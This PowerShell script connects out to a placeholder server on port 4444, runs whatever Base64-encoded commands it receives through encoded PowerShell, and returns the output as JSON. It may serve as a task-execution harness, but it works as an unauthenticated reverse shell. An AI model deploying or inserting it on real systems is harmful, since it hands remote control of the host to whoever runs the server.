# Define server and port
$server = "xxx.xxx.xxx.xxx" # Replace with your server's IP address or hostname
$port = 4444
$TASK="example"

# Create a TCP connection
$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
$encoding = [System.Text.Encoding]::UTF8
$reader = New-Object System.IO.StreamReader($stream, $encoding)
$writer = New-Object System.IO.StreamWriter($stream, $encoding)
$writer.AutoFlush = $true

while (($payloadEncoded = $reader.ReadLine()) -ne $null) {
    # Decode the Base64-encoded payload to retrieve the command
    Write-Host "Received payload: $payloadEncoded"
    try {
        $payloadBytes = [System.Convert]::FromBase64String($payloadEncoded)
        $command = $encoding.GetString($payloadBytes)
    }
    catch {
        Write-Host "Failed to decode payload: $_"
        Write-Host "Received raw payload: " + $payloadEncoded.Trim()
        $command = $payloadEncoded.Trim()
    }
    Write-Host "Decoded command: $($command.Trim())"

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "powershell.exe"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes('$ProgressPreference = "SilentlyContinue"; $TASK="' + $TASK + '";' + $command)
    $encodedCommand = [System.Convert]::ToBase64String($bytes)
    $process.StartInfo.Arguments = "-NoProfile -EncodedCommand $encodedCommand"
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true

    # Set an environment variable for the process
    $process.StartInfo.EnvironmentVariables["TASK"] = $TASK

    $process.Start() | Out-Null

    # Capture the outputs.
    $output = $process.StandardOutput.ReadToEnd().Trim()
    $errorOutput = $process.StandardError.ReadToEnd().Trim()
    $exitCode = $process.ExitCode

    $process.WaitForExit()

    # Now $output and $errorOutput contain the stdout and stderr, respectively.
    Write-Output "Output: $output"
    Write-Output "Error output: $errorOutput"
    Write-Output "Exit code: $exitCode"

    $stdoutBytes     = [System.Text.Encoding]::UTF8.GetBytes($output)
    $stderrBytes     = [System.Text.Encoding]::UTF8.GetBytes($errorOutput)

    # Build a JSON response (you could add more details if needed)
    $response = @{
        session_id = $(if ($env:SESSION_ID) { $env:SESSION_ID } else { "" })
        task       = $TASK
        stdout     = [System.Convert]::ToBase64String($stdoutBytes)
        stderr     = [System.Convert]::ToBase64String($stderrBytes)
        returncode = $exitCode
    }
    $json = $response | ConvertTo-Json -Compress

    # Send the JSON response followed by a newline
    $writer.WriteLine($json)
}

$client.Close()
